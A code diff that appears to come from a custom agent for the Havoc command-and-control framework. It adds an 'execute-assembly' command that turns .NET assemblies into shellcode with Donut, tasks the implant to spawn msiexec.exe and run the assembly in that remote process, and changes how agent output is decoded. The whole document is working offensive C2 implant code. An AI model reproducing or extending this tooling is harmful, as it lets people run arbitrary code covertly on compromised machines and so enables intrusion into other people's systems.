@@ -7,6 +7,7 @@ import os
 import subprocess
 import re
 import random
+import tempfile
 
 COMMAND_REGISTER         = 0x100
 COMMAND_GET_JOB          = 0x101
@@ -31,11 +32,125 @@ COMMAND_LS               = 0x402
 
 COMMAND_EBAPC            = 0x600
 
+COMMAND_EXECUTE_ASSEMBLY = 0x160
+
+
+# ==============================
+# ===== Configuration ==========
+# ==============================
+
+DONUT_PATH = "/home/kali/mdev/donut"
+PROFILE_PATH = "/home/kali/c2/Havoc/profiles/wkl_sample.yaotl"
+CONFIG_OUTPUT = "./Include/Config.h"
 
 
 # ====================
 # ===== Commands =====
 # ====================
+
+# execute .NET in another exe by utilizing donut shellcode
+class CommandExecuteAssembly(Command):
+    CommandId   = COMMAND_EXECUTE_ASSEMBLY
+    Name        = "execute-assembly"
+    Description = "Execute .NET assembly in remote process"
+    Help        = "Usage: execute-assembly <assembly_file> [arguments] [runtime]"
+    Mitr        = []
+    NeedAdmin   = False
+    Params      = [
+        CommandParam(name="assembly", is_file_path=True, is_optional=False),
+        CommandParam(name="arguments", is_file_path=False, is_optional=True),
+        CommandParam(name="runtime", is_file_path=False, is_optional=True)
+    ]
+
+    def assembly_to_shellcode(self, assembly_bytes: bytes, arguments: str = "", runtime: str = "v4") -> bytes:
+        """Convert .NET assembly to shellcode using Donut"""
+        runtime_map = {
+            "v2": "v2.0.50727",
+            "v4": "v4.0.30319",
+            "2": "v2.0.50727",
+            "4": "v4.0.30319",
+        }
+        clr_version = runtime_map.get(runtime.lower() if runtime else "v4", "v4.0.30319")
+        
+        # Write assembly to temp file
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as f:
+            f.write(assembly_bytes)
+            assembly_path = f.name
+        
+        shellcode_path = assembly_path + '.bin'
+        
+        try:
+            # Run Donut
+            cmd = [
+                DONUT_PATH,
+                '-i', assembly_path,
+                '-o', shellcode_path,
+                '-a', '2',
+                '-f', '1',
+                '-t',
+                '-r', clr_version
+            ]
+            
+            # Only add arguments if provided and not empty
+            if arguments and arguments.strip():
+                cmd.extend(['-p', arguments])
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode != 0:
+                return None
+            
+            # Read shellcode
+            with open(shellcode_path, 'rb') as f:
+                shellcode = f.read()
+            
+            return shellcode
+            
+        finally:
+            # Cleanup
+            if os.path.exists(assembly_path):
+                os.remove(assembly_path)
+            if os.path.exists(shellcode_path):
+                os.remove(shellcode_path)
+
+    def job_generate(self, arguments: dict) -> bytes:
+        Task = Packer()
+        Task.add_int(self.CommandId)
+        
+        # Spawn process
+        spawn = "C:\\Windows\\System32\\msiexec.exe"
+        Task.add_data(spawn.encode())
+        
+        # Get assembly (required)
+        assembly_b64 = arguments.get('assembly', '')
+        
+        if not assembly_b64:
+            # No assembly provided, send empty shellcode
+            Task.add_data(b'')
+            return Task.buffer
+        
+        # Get optional arguments - default to empty string (no args)
+        args = arguments.get('arguments', None)
+        if args is None or args == '':
+            args = ''  # No arguments - let assembly use its default behavior
+        
+        # Get optional runtime - default to v4
+        runtime = arguments.get('runtime', None)
+        if runtime is None or runtime == '':
+            runtime = 'v4'
+        
+        try:
+            assembly_bytes = b64decode(assembly_b64)
+            shellcode = self.assembly_to_shellcode(assembly_bytes, args, runtime)
+            
+            if shellcode:
+                Task.add_data(shellcode)
+            else:
+                Task.add_data(b'')
+        except Exception as e:
+            Task.add_data(b'')
+        
+        return Task.buffer
 
 class CommandEbapc( Command ):
     CommandId   = COMMAND_EBAPC
@@ -228,17 +343,6 @@ class CommandExit( Command ):
         Task.add_int( self.CommandId )
         return Task.buffer
 
-
-
-
-
-# ==============================
-# ===== Configuration ==========
-# ==============================
-
-DONUT_PATH = "/home/kali/mdev/donut"
-PROFILE_PATH = "/home/kali/c2/Havoc/profiles/sample.yaotl"
-CONFIG_OUTPUT = "./Include/Config.h"
 
 def generate_shellcode_from_exe(exe_path):
     """Convert compiled EXE to shellcode using Donut"""
@@ -467,6 +571,7 @@ class Mana(AgentType):
         CommandCd(),
         CommandLs(),
         CommandEbapc(),
+        CommandExecuteAssembly(),
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
@@ -655,10 +760,17 @@ class Mana(AgentType):
 
             elif Command == COMMAND_OUTPUT:
 
-                Output = response_parser.parse_str()
-                print( "[*] Output: \n" + Output )
-
-                self.console_message( AgentID, "Good", "Received Output:", Output )
+                # Use parse_bytes() instead of parse_str() to handle non-UTF-8
+                OutputBytes = response_parser.parse_bytes()
+                
+                # Decode with error handling
+                try:
+                    Output = OutputBytes.decode('utf-8')
+                except UnicodeDecodeError:
+                    # Fallback to latin-1 (accepts all byte values)
+                    Output = OutputBytes.decode('latin-1', errors='replace')
+                
+                self.console_message(AgentID, "Good", "Output:", Output)
 
             elif Command == COMMAND_UPLOAD:
 
